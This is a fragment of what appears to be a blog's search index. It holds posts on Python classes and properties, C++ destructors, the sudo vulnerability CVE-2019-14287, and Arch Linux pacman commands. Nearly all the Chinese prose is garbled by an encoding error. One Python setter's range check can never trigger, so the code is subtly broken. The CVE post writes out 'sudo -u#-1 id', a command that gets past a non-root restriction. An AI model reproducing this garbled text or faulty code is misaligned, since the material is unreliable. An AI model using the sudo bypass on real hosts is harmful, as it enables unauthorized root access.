·ï¼Œæˆ‘ä»¬ä¸å†™newæ–¹æ³•è¯•è¯•\n1 2 3 4 5 6 7 8 9  class A: # def __new__(cls,*args,**kwargs): # print('__new__') # return super().__new__(cls)#è¿™é‡Œä¸€å®šè¦è¿”å›ï¼Œå¦åˆ™__init__()æ–¹æ³•ä¸ä¼šè¢«æ‰§è¡Œ def __init__(self):#è¿™é‡Œçš„selfå°±æ˜¯newæ–¹æ³•ä¸­çš„returnè¿”å›å€¼ print('__init__') a = A()   è¾“å‡º\n__init__  ç§æœ‰å±æ€§-å°è£… åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¯¹è±¡ çš„ æŸäº›å±æ€§æˆ–æ–¹æ³• å¯èƒ½åªå¸Œæœ› åœ¨å¯¹è±¡çš„å†…éƒ¨è¢«ä½¿ç”¨ï¼Œè€Œ ä¸å¸Œæœ›åœ¨å¤–éƒ¨è¢«è®¿é—®åˆ°\nå®šä¹‰æ–¹å¼\nåœ¨ å®šä¹‰å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œåœ¨ å±æ€§åæˆ–è€…æ–¹æ³•åå‰ å¢åŠ  ä¸¤ä¸ªä¸‹åˆ’çº¿__ å®é™…å¼€å‘ä¸­ç§æœ‰å±æ€§ä¹Ÿä¸æ˜¯ä¸€å±‚ä¸å˜çš„ã€‚æ‰€ä»¥è¦ç»™ç§æœ‰å±æ€§æä¾›å¤–éƒ¨èƒ½å¤Ÿæ“ä½œçš„æ–¹æ³•ã€‚\n7.1) é€šè¿‡è‡ªå®šä¹‰get setæ–¹æ³•æä¾›ç§æœ‰å±æ€§çš„è®¿é—®\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Person: def __init__(self, name, age): self.name = name self.__age = age #å®šä¹‰å¯¹ç§æœ‰å±æ€§çš„getæ–¹æ³•ï¼Œè·å–ç§æœ‰å±æ€§ def getAge(self): return self.__age #å®šä¹‰å¯¹ç§æœ‰å±æ€§çš„é‡æ–°èµ‹å€¼çš„setæ–¹æ³•ï¼Œé‡ç½®ç§æœ‰å±æ€§ def setAge(self,age): self.__age = age person1 = Person(\"tom\",19) person1.setAge(20) print(person1.name,person1.getAge()) #tom 20   7.2) è°ƒç”¨propertyæ–¹æ³•æä¾›ç§æœ‰å±æ€§çš„è®¿é—®\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  class Student: def __init__(self, name, age): self.name = name self.__age = age #å®šä¹‰å¯¹ç§æœ‰å±æ€§çš„getæ–¹æ³•ï¼Œè·å–ç§æœ‰å±æ€§ def getAge(self): return self.__age #å®šä¹‰å¯¹ç§æœ‰å±æ€§çš„é‡æ–°èµ‹å€¼çš„setæ–¹æ³•ï¼Œé‡ç½®ç§æœ‰å±æ€§ def setAge(self,age): self.__age = age p = property(getAge,setAge) #æ³¨æ„é‡Œé¢getAge,setAgeä¸èƒ½å¸¦() s1 = Student(\"jack\",22) s1.p = 23 #å¦‚æœä½¿ç”¨=,åˆ™ä¼šåˆ¤æ–­ä¸ºèµ‹å€¼ï¼Œè°ƒç”¨setAgeæ–¹æ³•ã€‚ print(s1.name,s1.p) #jack 23 ï¼Œç›´æ¥ä½¿ç”¨s1.pä¼šè‡ªåŠ¨åˆ¤æ–­ä¼šå–å€¼ï¼Œè°ƒç”¨getAge print(s1.name,s1.getAge()) #jack 23,è¿™ä¸ªæ—¶å€™set,getæ–¹æ³•å¯ä»¥å•ç‹¬ä½¿ç”¨ã€‚   7.3) ä½¿ç”¨propertyæ ‡æ³¨æä¾›ç§æœ‰å±æ€§çš„è®¿é—®\næ³¨æ„ï¼š ä¸€æ—¦ç»™å‡½æ•°åŠ ä¸Šä¸€ä¸ªè£…é¥°å™¨@property,è°ƒç”¨å‡½æ•°çš„æ—¶å€™ä¸ç”¨åŠ æ‹¬å·å°±å¯ä»¥ç›´æ¥è°ƒç”¨å‡½æ•°äº†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  class Teacher: def __init__(self, name, age,speak): self.name = name self.__age = age self.__speak = speak @property #æ³¨æ„1.@protertyä¸‹é¢é»˜è®¤è·Ÿçš„æ˜¯getæ–¹æ³•ï¼Œå¦‚æœè®¾ç½®æˆsetä¼šæŠ¥é”™ã€‚ def age(self): return self.__age @age.setter #æ³¨æ„2.è¿™é‡Œæ˜¯ä½¿ç”¨çš„ä¸Šé¢å‡½æ•°å.setterï¼Œä¸æ˜¯property.setter. def age(self,age): if age \u003e 150 and age \u003c=0: #è¿˜å¯ä»¥åœ¨setteræ–¹æ³•é‡Œå¢åŠ åˆ¤æ–­æ¡ä»¶ print(\"å¹´é¾„è¾“å…¥æœ‰è¯¯\") else: self.__age = age @property def for_speak(self): #æ³¨æ„2.è¿™ä¸ªåŒåå‡½æ•°åå¯ä»¥è‡ªå®šä¹‰åç§°ï¼Œä¸€èˆ¬éƒ½æ˜¯é»˜è®¤ä½¿ç”¨å±æ€§åã€‚ return self.__speak @for_speak.setter def for_speak(self, speak): self.__speak = speak t1 = Teacher(\"herry\",45,\"Chinese\") t1.age = 38 #æ³¨æ„4.æœ‰äº†propertyåï¼Œç›´æ¥ä½¿ç”¨t1.age,è€Œä¸æ˜¯t1.age()æ–¹æ³•äº†ã€‚ t1.for_speak = \"English\" print(t1.name,t1.age,t1.for_speak) #herry 38 English    C++é¢å‘å¯¹è±¡ç¼–ç¨‹  å¼•ç”¨ï¼š\nc++é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡æ€»ç»“(ç±»çš„ä½¿ç”¨)\nC++ ç±» \u0026 å¯¹è±¡\nC++é¢å‘å¯¹è±¡åŸºç¡€\n ææ„å‡½æ•° ææ„å‡½æ˜¯ç±»çš„ä¸€ä¸ªæˆå‘˜å‡½æ•°ï¼Œåå­—ç”±æ³¢æµªå·æ¥ç±»åæ„æˆã€‚å®ƒæ²¡æœ‰è¿”å›å€¼ï¼Œä¹Ÿä¸æ¥å—å‚æ•°ï¼š\n1 2 3 4 5  class Foo{ public: ~Foo(); //ææ„å‡½æ•°  //...  };   ç”±äºææ„å‡½æ•°ä¸æ¥å—å‚æ•°ï¼Œå› æ­¤å®ƒä¸èƒ½è¢«é‡è½½ã€‚å¯¹äºä¸€ä¸ªç»™å®šç±»ï¼Œåªä¼šç”±å”¯ä¸€ä¸€ä¸ªææ„å‡½æ•°ã€‚\nåœ¨ä¸€ä¸ªæ„é€ å‡½æ•°ä¸­ï¼Œæˆå‘˜çš„åˆå§‹åŒ–æ—¶åœ¨å‡½æ•°ä½“æ‰§è¡Œä¹‹å‰å®Œæˆçš„ï¼Œä¸”æŒ‰ç…§å®ƒä»¬åœ¨ç±»ä¸­å‡ºç°çš„é¡ºåºè¿›è¡Œåˆå§‹åŒ–ã€‚åœ¨ä¸€ä¸ªææ„å‡½æ•°ä¸­ï¼Œé¦–å…ˆæ‰§è¡Œå‡½æ•°ä½“ï¼Œç„¶åé”€æ¯æˆå‘˜ã€‚æˆå‘˜æŒ‰åˆå§‹åŒ–é¡ºåºçš„é€†åºè¿›è¡Œé”€æ¯ã€‚\næ— è®ºä½•æ—¶ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨å…¶ææ„å‡½æ•°ï¼š\n â€‹\t1.å˜é‡åœ¨ç¦»å¼€å…¶ä½œç”¨åŸŸæ—¶è¢«é”€æ¯ â€‹\t2.å½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œå…¶æˆå‘˜è¢«é”€æ¯ â€‹\t3.å®¹å™¨(æ— è®ºæ˜¯æ ‡å‡†å®¹å™¨è¿˜æ˜¯æ•°ç»„)è¢«é”€æ¯æ—¶ï¼Œå…¶å…ƒç´ è¢«é”€æ¯ â€‹\t4.å¯¹äºåŠ¨æ€åˆ†é…çš„å¯¹è±¡ï¼Œå½“å¯¹æŒ‡å‘å®ƒçš„æŒ‡é’ˆåº”ç”¨deleteè¿ç®—ç¬¦æ—¶è¢«é”€æ¯ â€‹\t5.å¯¹äºä¸´æ—¶å¯¹è±¡ï¼Œå½“åˆ›å»ºå®ƒçš„å®Œæ•´è¡¨è¾¾å¼ç»“æŸæ—¶è¢«é”€æ¯\n    æœªå®Œå¾…ç»­\n   ","description":"","tags":[],"title":"Object-oriented Programming","uri":"/posts/object-oriented-programming/"},{"categories":["linux"],"content":" å¼•ç”¨ï¼š\nPotential bypass of Runas user restrictions (sudo official page)\nCVE-2019-14287ï¼šsudoæƒé™ç»•è¿‡æ¼æ´åˆ†æä¸å¤ç°\nLinux Sudoæš´userIDææƒæ¼æ´CVE-2019-14287\nsudo ç”¨æ³•ç®€ä»‹\n ç¬¬ä¸€æ¬¡å¤ç°CVEæ¼æ´ï¼Œååˆ†æ»´æ¿€åŠ¨\næ¦‚è¿° Sudo çš„å…¨ç§°æ˜¯â€œsuperuserdoâ€ï¼Œå®ƒæ˜¯Linuxç³»ç»Ÿç®¡ç†æŒ‡ä»¤ï¼Œå…è®¸ç”¨æˆ·åœ¨ä¸éœ€è¦åˆ‡æ¢ç¯å¢ƒçš„å‰æä¸‹ä»¥å…¶å®ƒç”¨æˆ·çš„æƒé™è¿è¡Œåº”ç”¨ç¨‹åºæˆ–å‘½ä»¤ã€‚é€šå¸¸ä»¥ root ç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤ï¼Œæ˜¯ä¸ºäº†å‡å°‘ root ç”¨æˆ·çš„ç™»å½•å’Œç®¡ç†æ—¶é—´ï¼ŒåŒæ—¶æé«˜å®‰å…¨æ€§ã€‚\n2019å¹´10æœˆ14æ—¥ï¼ŒSudoå®˜æ–¹å‘å¸ƒäº†Sudo 1.8.28ç‰ˆæœ¬ï¼Œå…¶ä¸­åŒ…å«sudo rootæƒé™ç»•è¿‡æ¼æ´ï¼ˆCVE-2019-14287ï¼‰çš„è¡¥ä¸ä¿®å¤ã€‚\nåˆ©ç”¨å‰æ  sudo -v \u003c 1.8.28 çŸ¥é“å½“å‰ç”¨æˆ·çš„å¯†ç  å½“å‰ç”¨æˆ·å­˜åœ¨äºsudoæƒé™åˆ—è¡¨  æ¼æ´å¤ç° å¤ç°æ˜¯åœ¨sudo 1.8.16çš„ç‰ˆæœ¬ä¸‹è¿›è¡Œçš„ï¼Œå¯¹äºä½äº1.8.28çš„ç‰ˆæœ¬éƒ½èµ·ä½œç”¨\n1  test\tALL=(ALL,!root)\t/usr/bin/id   å…¶ä¸­ï¼Œåœ¨sudoersé…ç½®ä¸­ï¼Œä»¥ä¸Šè¯­å¥ä»£è¡¨ç€testç”¨æˆ·ï¼ŒALL=(ALL,!root)ä»£è¡¨æŒ‡å®šç”¨æˆ·ï¼Œå³æ‰€æœ‰é™¤rootä»¥å¤–çš„ç”¨æˆ·éƒ½å¯è¿è¡Œå‘½ä»¤/usr/bin/id\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¤§å¤šæ•°Linuxå‘è¡Œç‰ˆçš„Runasè§„èŒƒï¼ˆ/etc /sudoersï¼‰éƒ½å¦‚ä¸‹å›¾ï¼ˆç¬¬ä¸‰å¼ å›¾ï¼‰æ‰€ç¤ºï¼Œå…¶ä¸­å®šä¹‰çš„ALLå…³é”®å­—å°†å…è®¸adminæˆ–sudoç»„ä¸­çš„ç”¨æˆ·ä»¥ç›®æ ‡ç³»ç»Ÿä¸­çš„ä»»æ„ç”¨æˆ·èº«ä»½æ¥è¿è¡Œå‘½ä»¤\nå¦‚æœæƒ³åˆ©ç”¨è¯¥æ¼æ´æ¥å®æ–½æ”»å‡»ï¼Œç”¨æˆ·éœ€è¦æ‹¥æœ‰sudoæƒé™ï¼Œå¹¶å…è®¸ç”¨æˆ·ä½¿ç”¨ä»»æ„ç”¨æˆ·IDæ¥è¿è¡Œå‘½ä»¤ï¼ˆå¦‚ä¸‹å›¾ä¸­å®šä¹‰äº†testç”¨æˆ·å¯ç”¨idå‘½ä»¤ï¼Œä½†ä¸èƒ½ä»¥rootç”¨æˆ·æ‰§è¡Œå‘½ä»¤idï¼ˆtest ALL=(ALL,!root) /usr/bin/idï¼‰ï¼‰ã€‚é€šå¸¸æ¥è¯´ï¼Œè¿™æ„å‘³ç€ç”¨æˆ·çš„sudoeré¡¹åœ¨Runasè§„èŒƒä¸­å®šä¹‰äº†ç‰¹æ®Šçš„ALLå€¼ã€‚å¦‚æœsudoerç­–ç•¥å…è®¸çš„è¯ï¼Œsudoæ”¯æŒç”±ç”¨æˆ·æŒ‡å®šçš„ç”¨æˆ·åæˆ–ç”¨æˆ·IDæ¥è¿è¡Œå‘½ä»¤ã€‚\nå¦‚æœsudoeræ¡ç›®å…è®¸ç”¨æˆ·ä»¥ä»»æ„ç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤ï¼ˆérootï¼‰ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ¥ç»•è¿‡è¿™ç§é™åˆ¶äº†ã€‚\n1 2  sudo -u#-1 id sudo -u#4294967295 id   ä¸Šè¿°å‘½ä»¤è¿è¡Œä¹‹åï¼Œå°†è¿”å›â€œ0â€ã€‚è¿™æ˜¯å› ä¸ºsudoå‘½ä»¤æœ¬èº«å·²ç»åœ¨ä»¥ç”¨æˆ·IDâ€œ0â€è¿è¡Œäº†ï¼Œæ‰€ä»¥å½“sudoå°è¯•å°†ç”¨æˆ·IDä¿®æ”¹ä¸ºâ€œ-1â€æ—¶ï¼Œä¸ä¼šå‘ç”Ÿä»»ä½•å˜åŒ–ã€‚\nä½†æ˜¯ï¼Œsudoæ—¥å¿—æ¡ç›®ä¸­è®°å½•ä¸‹çš„å‘½ä»¤è¿è¡Œç”¨æˆ·çš„IDä¸ºâ€œ4294967295â€ï¼Œè€Œå¹¶érootç”¨æˆ·ï¼ˆæˆ–ç”¨æˆ·IDä¸ºâ€œ0â€ï¼‰ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œå› ä¸ºç”¨æˆ·IDæ˜¯é€šè¿‡-ué€‰é¡¹æŒ‡å®šçš„ï¼Œå¹¶ä¸”ä¸ä¼šåœ¨å¯†ç æ•°æ®åº“ä¸­å­˜å‚¨ï¼Œæ‰€ä»¥PAMä¼šè¯æ¨¡å—ä¹Ÿä¸ä¼šè¿è¡Œã€‚\næ¼æ´ç‰‡æ®µ\næ¼æ´CVE-2019-14287çš„æºäºsudoè°ƒç”¨çš„ç³»ç»Ÿå‡½æ•°setresuid()å’Œsetreuid()åœ¨å‚æ•°å¤„ç†ä¸­ä¼šå°† -1ï¼ˆæˆ–å…¶ç­‰æ•ˆçš„æ— ç¬¦å·æ•´æ•°4294967295ï¼‰è¯¯è®¤ä¸ºæ˜¯ 0ï¼Œè€Œè¿™æ­£å¥½æ˜¯ root ç”¨æˆ·çš„UserID ã€‚\nå®é™…ä¸Šï¼Œåªè¦ç”¨æˆ·çš„æƒé™è¶³å¤Ÿé«˜ï¼Œå³æ‹¥æœ‰æœ€é«˜sudoæƒé™çš„ç”¨æˆ·ï¼Œå¹¶ä¸”åœ¨Runasè§„èŒƒä¸­å®šä¹‰äº†ALLå…³é”®å­—çš„è¯ï¼Œä»–ä»¬å°±å¯ä»¥è¿è¡ŒRunasè§„èŒƒä¸­æ˜ç¡®ç¦æ­¢ä½¿ç”¨çš„é‚£äº›rootå‘½ä»¤ï¼Œè€Œä¸”ä»¥è¿™ç§æ–¹å¼è¿è¡Œçš„å‘½ä»¤å…¶æ—¥å¿—é¡¹æ‰€æ˜¾ç¤ºçš„ç›®æ ‡ç”¨æˆ·ä¸º4294967295ï¼Œè€Œä¸æ˜¯rootã€‚ä¸æ­¤åŒæ—¶ï¼Œåœ¨æ‰§è¡Œç›¸åº”å‘½ä»¤çš„è¿‡ç¨‹ä¸­ï¼ŒPAMä¼šè¯æ¨¡å—å°†ä¸ä¼šè¿è¡Œã€‚\n","description":"","tags":["CVE","linux"],"title":"CVE-2019-14287","uri":"/posts/cve-2019-14287/"},{"categories":["linux"],"content":"åŒ…ç®¡ç†å·¥å…· Pacman  å‚è€ƒï¼š\nPacman Home Page\n[pacman wiki](https://wiki.archlinux.org/index.php/Pacman_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)\nArchLinux çš„ pacman å‘½ä»¤è¯¦è§£\n  è­¦å‘Š: åœ¨Archä¸‹å®‰è£…è½¯ä»¶åŒ…æ—¶ï¼Œæœªæ›´æ–°ç³»ç»Ÿå‰ï¼Œä¸è¦æ›´æ–°è½¯ä»¶åŒ…æ•°æ®åº“ï¼ˆä¾‹å¦‚ï¼Œå¯èƒ½å‡ºç°æŸè½¯ä»¶åŒ…ä¸å†å‡ºç°åœ¨å®˜æ–¹åº“ï¼‰ã€‚æ“ä½œæ—¶ï¼Œåº”ä½¿ç”¨pacman -Syu *package_name*, è€Œä¸è¦ä½¿ç”¨ï¼ˆpacman -Sy *package_name*ï¼‰ï¼Œå¦åˆ™å¯èƒ½ä¼šæœ‰ä¾èµ–é—®é¢˜ã€‚å‚è§ System maintenance (ç®€ä½“ä¸­æ–‡)#ä¸æ”¯æŒéƒ¨åˆ†å‡çº§ å’Œ BBS#89328.\n å®‰è£…æŒ‡å®šçš„åŒ… å®‰è£…æˆ–è€…å‡çº§å•ä¸ªè½¯ä»¶åŒ…ï¼Œæˆ–è€…ä¸€åˆ—è½¯ä»¶åŒ…ï¼ˆåŒ…å«ä¾èµ–åŒ…ï¼‰ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š\n1  $ pacman -S package_name1 package_name2 ...   ç”¨æ­£åˆ™è¡¨è¾¾å¼å®‰è£…å¤šä¸ªè½¯ä»¶åŒ…ï¼ˆå‚è§ pacman å°è´´å£«: invalid section]å’Œè¿™ä¸ªå¸–å­ï¼‰ï¼š\n1  $ pacman -S $(pacman -Ssq package_regex)   æœ‰æ—¶å€™åœ¨ä¸åŒçš„è½¯ä»¶ä»“åº“ä¸­ï¼Œä¸€ä¸ªè½¯ä»¶åŒ…æœ‰å¤šä¸ªç‰ˆæœ¬ï¼ˆæ¯”å¦‚[extra]å’Œ[testing]ï¼‰ã€‚å¯ä»¥é€‰æ‹©ä¸€ä¸ªæ¥å®‰è£…ï¼š\n1  $ pacman -S extra/package_name   å®‰è£…å¤šä¸ªå«æœ‰ç›¸ä¼¼åç§°çš„è½¯ä»¶åŒ…ï¼Œè€Œå¹¶éæ•´ä¸ªåŒ…ç»„æˆ–å…¨éƒ¨åŒ¹é…çš„è½¯ä»¶åŒ…ï¼› ä¾‹å¦‚ï¼Œplasma:\n1  $ pacman -S plasma-{desktop,mediacenter,nm}   å½“ç„¶ï¼Œå¯ä»¥å¤šå±‚æ‰©å±•ï¼Œå¹¶ä¸ä½œé™åˆ¶ï¼š\n1  $ pacman -S plasma-{workspace{,-wallpapers},pa}   å®‰è£…åŒ…ç»„ ä¸€äº›åŒ…å±äºä¸€ä¸ªå¯ä»¥åŒæ—¶å®‰è£…çš„è½¯ä»¶åŒ…ç»„ã€‚ä¾‹å¦‚ï¼Œè¿è¡Œä¸‹é¢çš„å‘½ä»¤\n1  $ pacman -S gnome   ä¼šæé†’ç”¨æˆ·é€‰æ‹© gnome å†…éœ€è¦å®‰è£…çš„åŒ…ã€‚\næœ‰çš„åŒ…ç»„åŒ…å«å¤§é‡çš„è½¯ä»¶åŒ…ï¼Œæœ‰æ—¶ç”¨æˆ·åªéœ€å…¶ä¸­å‡ ä¸ªã€‚é™¤äº†é€ä¸€é”®å…¥åºå·å¤–ï¼Œpacman è¿˜æ”¯æŒé€‰æ‹©æˆ–æ’é™¤æŸä¸ªåŒºé—´å†…çš„çš„è½¯ä»¶åŒ…ï¼š\n1  Enter a selection (default=all): 1-10 15   è¿™å°†é€‰ä¸­åºå· 1 è‡³ 10 å’Œ 15 çš„è½¯ä»¶åŒ…ã€‚è€Œ\n1  Enter a selection (default=all): ^5-8 ^2   å°†ä¼šé€‰ä¸­é™¤äº†åºå· 5 è‡³ 8 å’Œ 2 ä¹‹å¤–çš„æ‰€æœ‰è½¯ä»¶åŒ…ã€‚\næƒ³è¦æŸ¥çœ‹å“ªäº›åŒ…å±äº gnome ç»„ï¼Œè¿è¡Œï¼š\n1  $ pacman -Sg gnome   ä¹Ÿå¯ä»¥è®¿é—® https://www.archlinux.org/groups/ æŸ¥çœ‹å¯ç”¨çš„åŒ…ç»„ã€‚\næ³¨æ„: å¦‚æœåˆ—è¡¨ä¸­çš„åŒ…å·²ç»å®‰è£…åœ¨ç³»ç»Ÿä¸­ï¼Œå®ƒä¼šè¢«é‡æ–°å®‰è£…ï¼Œå³ä½¿å®ƒå·²ç»æ˜¯æœ€æ–°çš„ã€‚å¯ä»¥ç”¨ --needed é€‰é¡¹è¦†ç›–è¿™ç§è¡Œä¸ºã€‚\nåˆ é™¤è½¯ä»¶åŒ… åˆ é™¤å•ä¸ªè½¯ä»¶åŒ…ï¼Œä¿ç•™å…¶å…¨éƒ¨å·²ç»å®‰è£…çš„ä¾èµ–å…³ç³»\n1  $ pacman -R package_name   åˆ é™¤æŒ‡å®šè½¯ä»¶åŒ…ï¼ŒåŠå…¶æ‰€æœ‰æ²¡æœ‰è¢«å…¶ä»–å·²å®‰è£…è½¯ä»¶åŒ…ä½¿ç”¨çš„ä¾èµ–å…³ç³»ï¼š\n1  $ pacman -Rs package_name   è¦åˆ é™¤è½¯ä»¶åŒ…å’Œæ‰€æœ‰ä¾èµ–è¿™ä¸ªè½¯ä»¶åŒ…çš„ç¨‹åº:\nè­¦å‘Š: æ­¤æ“ä½œæ˜¯é€’å½’çš„ï¼Œè¯·å°å¿ƒæ£€æŸ¥ï¼Œå¯èƒ½ä¼šä¸€æ¬¡åˆ é™¤å¤§é‡çš„è½¯ä»¶åŒ…ã€‚\n1  $ pacman -Rsc package_name   è¦åˆ é™¤è½¯ä»¶åŒ…ï¼Œä½†æ˜¯ä¸åˆ é™¤ä¾èµ–è¿™ä¸ªè½¯ä»¶åŒ…çš„å…¶ä»–ç¨‹åºï¼š\n1  $ pacman -Rdd package_name   pacman åˆ é™¤æŸäº›ç¨‹åºæ—¶ä¼šå¤‡ä»½é‡è¦é…ç½®æ–‡ä»¶ï¼Œåœ¨å…¶åé¢åŠ ä¸Š*.pacsaveæ‰©å±•åã€‚-n é€‰é¡¹å¯ä»¥é¿å…å¤‡ä»½è¿™äº›æ–‡ä»¶ï¼š\n1  $ pacman -Rn package_name   æ³¨æ„: pacman ä¸ä¼šåˆ é™¤è½¯ä»¶è‡ªå·±åˆ›å»ºçš„æ–‡ä»¶(ä¾‹å¦‚ä¸»ç›®å½•ä¸­çš„ .dot æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤ã€‚\nå‡çº§è½¯ä»¶åŒ…  è­¦å‘Š: * å»ºè®®æ‰€æœ‰ç”¨æˆ·éƒ½ç»å¸¸æ€§çš„æ›´æ–°ç³»ç»Ÿ\n Arch åªæ”¯æŒç³»ç»Ÿå®Œæ•´å‡çº§ï¼Œè¯¦ç»†å‚è§ä¸æ”¯æŒéƒ¨åˆ†å‡çº§å’Œ#å®‰è£…è½¯ä»¶åŒ…ã€‚   ä¸€ä¸ª pacman å‘½ä»¤å°±å¯ä»¥å‡çº§æ•´ä¸ªç³»ç»Ÿã€‚èŠ±è´¹çš„æ—¶é—´å–å†³äºç³»ç»Ÿæœ‰å¤šè€ã€‚è¿™ä¸ªå‘½ä»¤ä¼šåŒæ­¥éæœ¬åœ°(local)è½¯ä»¶ä»“åº“å¹¶å‡çº§ç³»ç»Ÿçš„è½¯ä»¶åŒ…ï¼š\n1  $ pacman -Syu   æŸ¥è¯¢åŒ…æ•°æ®åº“ pacman ä½¿ç”¨ -Q å‚æ•°æŸ¥è¯¢æœ¬åœ°è½¯ä»¶åŒ…æ•°æ®åº“ã€‚å‚è§ï¼š\n1  $ pacman -Q --help   ä½¿ç”¨ -S å‚æ•°æ¥æŸ¥è¯¢è¿œç¨‹åŒæ­¥çš„æ•°æ®åº“ã€‚å‚è§ï¼š\n1  $ pacman -S --help   pacman å¯ä»¥åœ¨åŒ…æ•°æ®åº“ä¸­æŸ¥è¯¢è½¯ä»¶åŒ…ï¼ŒæŸ¥è¯¢ä½ç½®åŒ…å«äº†è½¯ä»¶åŒ…çš„åå­—å’Œæè¿°ï¼š\n1  $ pacman -Ss string1 string2 ...   æœ‰æ—¶ï¼Œ-sçš„å†…ç½®æ­£åˆ™ä¼šåŒ¹é…å¾ˆå¤šä¸éœ€è¦çš„ç»“æœï¼Œæ‰€ä»¥åº”å½“æŒ‡å®šä»…æœç´¢åŒ…åï¼Œè€Œéæè¿°æˆ–å…¶ä»–å­æ®µï¼Œä¸‹é¢çš„å‘½ä»¤å°±ä¼šè¿”å›å¾ˆå¤šä¸å¿…è¦ç»“æœ:\n1  $ pacman -Ss '^vim-'   è¦æŸ¥è¯¢å·²å®‰è£…çš„è½¯ä»¶åŒ…ï¼š\n1  $ pacman -Qs string1 string2 ...   æŒ‰æ–‡ä»¶åæŸ¥æ‰¾è½¯ä»¶åº“ï¼š\n1  $ pacman -Fs string1 string2 ...   æ˜¾ç¤ºè½¯ä»¶åŒ…çš„è¯¦å°½çš„ä¿¡æ¯ï¼š\n1  $ pacman -Si package_name   æŸ¥è¯¢æœ¬åœ°å®‰è£…åŒ…çš„è¯¦ç»†ä¿¡æ¯ï¼š\n1  $ pacman -Qi package_name   ä½¿ç”¨ä¸¤ä¸ª -i å°†åŒæ—¶æ˜¾ç¤ºå¤‡ä»½æ–‡ä»¶å’Œä¿®æ”¹çŠ¶æ€ï¼š\n1  $ pacman -Qii package_name   è¦è·å–å·²å®‰è£…è½¯ä»¶åŒ…æ‰€åŒ…å«æ–‡ä»¶çš„åˆ—è¡¨ï¼š\n1  $ pacman -Ql package_name   æŸ¥è¯¢è¿œç¨‹åº“ä¸­è½¯ä»¶åŒ…åŒ…å«çš„æ–‡ä»¶ï¼š\n1  $ pacman -Fl package_name   æ£€æŸ¥è½¯ä»¶åŒ…å®‰è£…çš„æ–‡ä»¶æ˜¯å¦éƒ½å­˜åœ¨ï¼š\n1  $ pacman -Qk package_name   ä¸¤ä¸ªå‚æ•°kå°†ä¼šæ‰§è¡Œä¸€æ¬¡æ›´å½»åº•çš„æ£€æŸ¥ã€‚ æŸ¥è¯¢æ•°æ®åº“è·å–æŸä¸ªæ–‡ä»¶å±äºå“ªä¸ªè½¯ä»¶åŒ…ï¼š\n1  $ pacman -Qo /path/to/file_name   æŸ¥è¯¢æ–‡ä»¶å±äºè¿œç¨‹æ•°æ®åº“ä¸­çš„å“ªä¸ªè½¯ä»¶åŒ…ï¼š\n1  $ pacman -Fo /path/to/file_name   è¦ç½—åˆ—æ‰€æœ‰ä¸å†ä½œä¸ºä¾èµ–çš„è½¯ä»¶åŒ…(å­¤ç«‹orphans)ï¼š\n1  $ pacman -Qdt   è¦ç½—åˆ—æ‰€æœ‰æ˜ç¡®å®‰è£…è€Œä¸”ä¸è¢«å…¶å®ƒåŒ…ä¾èµ–çš„è½¯ä»¶åŒ…ï¼š\n1  $ pacman -Qet   è¦æ˜¾ç¤ºè½¯ä»¶åŒ…çš„ä¾èµ–æ ‘ï¼š\n1  $ pactree package_name   æ£€æŸ¥ä¸€ä¸ªå®‰è£…çš„è½¯ä»¶åŒ…è¢«é‚£äº›åŒ…ä¾èµ–ï¼Œå¯ä»¥ä½¿ç”¨ pkgtoolsAURä¸­çš„whoneeds:\n1  $ whoneeds package_name   æˆ–è€…pactreeä¸­ä½¿ç”¨-r:\n1  $ pactree -r package_name   æ•°æ®åº“ç»“æ„ pacmanæ•°æ®åº“é€šå¸¸ä½äº /var/lib/pacman/sync. å¯¹äºæ¯ä¸€ä¸ªåœ¨/etc/pacman.confä¸­æŒ‡å®šçš„è½¯ä»¶ä»“åº“ï¼Œ è¿™é‡Œéƒ½æœ‰ä¸€ä¸ªä¸€è‡´çš„æ•°æ®åº“ã€‚æ•°æ®åº“æ–‡ä»¶å¤¹é‡Œæ¯ä¸ªtar.gzæ–‡ä»¶éƒ½åŒ…å«ç€ä¸€ä¸ªä»“åº“çš„è½¯ä»¶åŒ…ä¿¡æ¯ã€‚ä¾‹å¦‚which åŒ…:\n% tree which-2.20-6 which-2.20-6 |-- depends `-- desc è¿™ä¸ª depends é¡¹åˆ—å‡ºäº†è¯¥è½¯ä»¶çš„ä¾èµ–åŒ…ï¼Œ è€Œdescæœ‰è¯¥åŒ…çš„ä»‹ç»ï¼Œä¾‹å¦‚æ–‡ä»¶å¤§å°å’ŒMD5å€¼ ã€‚\næ¸…ç†è½¯ä»¶åŒ…ç¼“å­˜ pacman å°†ä¸‹è½½çš„è½¯ä»¶åŒ…ä¿å­˜åœ¨ /var/cache/pacman/pkg/ å¹¶ä¸”ä¸ä¼šè‡ªåŠ¨ç§»é™¤æ—§çš„å’Œæœªå®‰è£…ç‰ˆæœ¬çš„è½¯ä»¶åŒ…ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨æ¸…ç†ï¼Œä»¥å…è¯¥æ–‡ä»¶å¤¹è¿‡äºåºå¤§ã€‚\nä½¿ç”¨å†…å»ºé€‰é¡¹å³å¯æ¸…é™¤æœªå®‰è£…è½¯ä»¶åŒ…çš„ç¼“å­˜ï¼š\n1  $ pacman -Sc   è­¦å‘Š:\n ä»…åœ¨ç¡®å®šå½“å‰å®‰è£…çš„è½¯ä»¶åŒ…è¶³å¤Ÿç¨³å®šä¸”ä¸éœ€è¦é™çº§æ—¶æ‰æ‰§è¡Œæ¸…ç†ã€‚pacman 